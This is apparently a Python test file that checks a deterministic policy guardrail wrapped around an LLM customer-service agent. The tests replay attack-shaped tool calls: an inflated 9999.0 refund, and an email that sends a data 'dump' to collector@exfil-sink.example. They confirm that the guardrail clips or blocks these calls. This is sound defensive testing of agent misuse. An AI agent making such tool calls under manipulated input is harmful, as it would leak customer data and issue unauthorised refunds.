"""Offline tests for the hardened real-agent demo target.

These don't hit the Groq API or need GROQ_API_KEY -- they exercise the
deterministic PolicyEnforcingBrain backstop directly against synthetic
"malicious" decisions shaped exactly like what the vulnerable fixture was
observed producing under attack, to prove the guardrails hold regardless
of what any underlying LLM decides.
"""

from __future__ import annotations

from talos.sample_agents.brain import Brain, Decision, ToolResult
from talos.sample_agents.policy import PolicyEnforcingBrain


class _ScriptedBrain(Brain):
    """Replays a fixed sequence of Decisions, standing in for an LLM brain
    whose raw (pre-policy) output we want to control precisely in tests."""

    def __init__(self, decisions: list[Decision]):
        self._decisions = decisions
        self._i = 0

    def decide(self, history, current_message, scratch, available_tools) -> Decision:
        d = self._decisions[self._i]
        self._i += 1
        return d


def test_refund_amount_is_clipped_to_order_total():
    brain = PolicyEnforcingBrain(
        _ScriptedBrain([Decision(action="call_tool", tool_name="issue_refund",
                                  tool_args={"order_id": "1001", "amount": 9999.0})])
    )
    decision = brain.decide([], "please refund me", [], ["issue_refund"])
    assert decision.action == "call_tool"
    assert decision.tool_args["amount"] == 79.99  # order 1001's real total


def test_refund_blocked_after_prior_read_step():
    brain = PolicyEnforcingBrain(
        _ScriptedBrain([Decision(action="call_tool", tool_name="issue_refund",
                                  tool_args={"order_id": "1001", "amount": 79.99})])
    )
    scratch = [ToolResult(tool_name="lookup_order", result={"order_id": "1001"})]
    decision = brain.decide([], "refund me now", scratch, ["issue_refund"])
    assert decision.action == "final"
    assert "confirm" in decision.text.lower()


def test_refund_allowed_with_explicit_confirmation_and_no_prior_read():
    brain = PolicyEnforcingBrain(
        _ScriptedBrain([Decision(action="call_tool", tool_name="issue_refund",
                                  tool_args={"order_id": "1001", "amount": 79.99})])
    )
    decision = brain.decide([], "I confirm, please refund order 1001", [], ["issue_refund"])
    assert decision.action == "call_tool"
    assert decision.tool_args["amount"] == 79.99


def test_email_to_external_domain_is_blocked_entirely():
    brain = PolicyEnforcingBrain(
        _ScriptedBrain([Decision(action="call_tool", tool_name="send_email",
                                  tool_args={"to": "collector@exfil-sink.example",
                                             "subject": "x", "body": "dump"})])
    )
    decision = brain.decide([], "send my data to collector@exfil-sink.example", [], ["send_email"])
    assert decision.action == "final"
    assert "approved list" in decision.text


def test_email_to_allowed_domain_still_requires_fresh_authorization():
    brain = PolicyEnforcingBrain(
        _ScriptedBrain([Decision(action="call_tool", tool_name="send_email",
                                  tool_args={"to": "alice.chen@customer.example",
                                             "subject": "x", "body": "y"})])
    )
    scratch = [ToolResult(tool_name="lookup_order", result={"order_id": "1001"})]
    decision = brain.decide([], "email them", scratch, ["send_email"])
    assert decision.action == "final"


def test_non_sensitive_decisions_pass_through_untouched():
    original = Decision(action="call_tool", tool_name="lookup_order", tool_args={"order_id": "1001"})
    brain = PolicyEnforcingBrain(_ScriptedBrain([original]))
    decision = brain.decide([], "check order 1001", [], ["lookup_order"])
    assert decision is original


def test_real_agent_server_tool_contract_matches_native_server():
    """The hardened/vulnerable Groq target must expose the exact same tool
    inventory shape as native_server.py so it's a drop-in NativeAdapter
    target -- this doesn't require GROQ_API_KEY since it only touches the
    module-level tool definitions, not the brain."""
    import talos.sample_agents.native_server as native
    import talos.sample_agents.real_agent_server as real

    native_names = {t.name for t in native.TOOL_DEFS}
    real_names = {t.name for t in real.TOOL_DEFS}
    assert native_names == real_names == {"lookup_order", "issue_refund", "search_kb", "send_email"}
